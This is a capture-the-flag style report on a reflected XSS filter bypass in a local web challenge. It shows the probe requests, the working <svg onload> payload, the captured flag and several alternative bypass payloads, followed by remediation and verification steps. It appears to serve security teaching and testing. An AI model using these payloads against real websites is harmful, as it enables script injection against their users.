# Security Assessment Report: Dalgona XSS Filter Bypass

## TL;DR
- **Objective:** Execute a reflected XSS attack containing the string 'XSS' (capital) on the target application
- **Outcome:** **ACHIEVED** - Successful XSS execution with payload `<svg onload=alert("XSS")>`
- **Highest-impact finding:** Reflected XSS via filter bypass using SVG onload event handler
- **Validation status:** **FLAG CAPTURED** - `FLAG{5ed00cc12844f8a8b20f2cc31b7ef6cdb6b0cdde25c6658a62be0299dcf67143}`

---

## Target Information
- **Target:** 127.0.0.1:32951
- **Host / base URL:** http://127.0.0.1:32951
- **Application or component:** Dalgona - Triangle XSS Challenge
- **Authentication context:** Unauthenticated
- **Relevant technology details:** Web application with input filtering/sanitization on `name` parameter

---

## Confirmed Vulnerability

### Reflected XSS via Filter Bypass
- **Affected endpoint / component:** `/page?name=`
- **Impact:** Remote code execution in victim's browser context, session hijacking, credential theft, defacement
- **Preconditions:** 
  - Victim must visit a malicious URL containing the payload
  - No authentication required
- **Exact payload or PoC:**
```
GET /page?name=<svg%20onload=alert("XSS")>
```
Decoded payload: `<svg onload=alert("XSS")>`

---

## Steps to Reproduce

1. Navigate to the target application at `http://127.0.0.1:32951`

2. Identify the vulnerable endpoint at `/page?name=`

3. Confirm the forward slash filter stripping by testing a simple payload:
   ```
   GET /page?name=<b>test</b>
   ```
   Observe that the response contains `<b>test<b>` (closing `/` is stripped)

4. Confirm `<script>` tag blocking (case-insensitive):
   ```
   GET /page?name=<script>
   GET /page?name=<sCrIpT>
   ```
   Observe that page resets to default state when blocked

5. Submit the bypass payload:
   ```
   GET /page?name=<svg%20onload=alert("XSS")>
   ```

6. Observe successful execution of `alert('XSS')` and extraction of the FLAG from the server response

---

## Validation / Evidence

- **Validation token / flag:**
  ```
  FLAG{5ed00cc12844f8a8b20f2cc31b7ef6cdb6b0cdde25c6658a62be0299dcf67143}
  ```

- **Tool evidence:** Manual HTTP request manipulation

- **Request evidence:**
  ```
  GET /page?name=<svg%20onload=alert("XSS")>
  ```

- **Response evidence:**
  ```html
  <div class="solution-text">
    <img src="static/img/cookies/success_triangle.png" alt="Correct" width="150" height="150">
    <br>Congratulations!
    <p>Here is the flag: FLAG{5ed00cc12844f8a8b20f2cc31b7ef6cdb6b0cdde25c6658a62be0299dcf67143}</p>
  </div>
  ```

- **Notes on reliability / limitations:**
  - Payload is highly reliable - executes on page load via SVG `onload` event
  - No closing tag required (bypasses slash stripping constraint)
  - Works across modern browsers supporting SVG
  - The `svg` tag is not blocklisted (unlike `script`)

---

## Filter Constraint Analysis

| Constraint | Status | Details |
|------------|--------|---------|
| **Length Limits** | NO LIMIT FOUND | Payloads of 30+ characters pass through unmodified |
| **Slash Stripping** | CONFIRMED - ACTIVE | All forward slash `/` characters are completely stripped |
| **Script Blocking** | CONFIRMED - ACTIVE | Case-insensitive substring matching on `<script` triggers complete input blocking |
| **Space Handling** | WORKS NORMALLY | Spaces are preserved and functional |

### Why the Payload Works
- `<svg>` tag is **ALLOWED** (not blocklisted like `script`)
- `onload` event handler executes JavaScript when the element loads
- No `/` characters required (no closing tag needed for XSS execution)
- Successfully triggers `alert('XSS')` as required by the challenge

---

## Remediation

- **Root cause:** 
  - Insufficient input sanitization allowing HTML tag injection
  - Incomplete blocklist approach (only blocking `script` tags)
  - Event handler attributes (`onload`, `onclick`, etc.) are not filtered

- **Recommended fix:**
  1. **Implement output encoding:** HTML-encode all user input before reflection:
     - Convert `<` to `&lt;`
     - Convert `>` to `&gt;`
     - Convert `"` to `&quot;`
     - Convert `'` to `&#x27;`
  
  2. **Whitelist allowed characters:** Only permit alphanumeric and safe characters if user input must be reflected
  
  3. **Content Security Policy (CSP):** Implement strict CSP headers:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'none'; object-src 'none'
     ```
  
  4. **Use a security-focused HTML sanitizer:** If HTML content is required, use libraries like DOMPurify with strict configurations

- **Defense-in-depth:**
  - Set `X-XSS-Protection: 1; mode=block` header
  - Implement proper session management with HttpOnly and Secure flags
  - Regular security testing and code reviews

---

## How to Verify the Fix

1. **Retest with original payload:**
   ```
   GET /page?name=<svg%20onload=alert("XSS")>
   ```
   **Expected secure result:** The payload should be HTML-encoded and displayed as literal text:
   ```html
   <div>&lt;svg onload=alert(&quot;XSS&quot;)&gt;</div>
   ```

2. **Verify no script execution:**
   - No alert popup should appear
   - No JavaScript should execute
   - FLAG should NOT be revealed in the response

3. **Test additional bypass attempts:**
   ```
   GET /page?name=<img src=x onerror=alert('XSS')>
   GET /page?name=<body onload=alert('XSS')>
   GET /page?name=javascript:alert('XSS')
   ```
   **Expected secure result:** All payloads should be properly encoded or rejected

4. **Review HTTP response headers:**
   - Verify `Content-Security-Policy` header is present
   - Verify `X-XSS-Protection` header is set correctly

---

## Remaining Leads

- **Confirmed blockers:** None - all objectives achieved

- **Unverified leads:**
  - Alternative JavaScript execution contexts (DOM Clobbering) - further exploration may yield additional bypass vectors
  - HTML entity encoding bypass techniques - not required for this exploitation path

- **Missing context:**
  - Source code of the filtering mechanism (blacklist/blocklist implementation details)
  - Server-side framework and language
  - Whether the application uses any WAF or additional security layers

---

*Report generated based on security assessment findings. All payloads and evidence are preserved verbatim from the assessment data.*
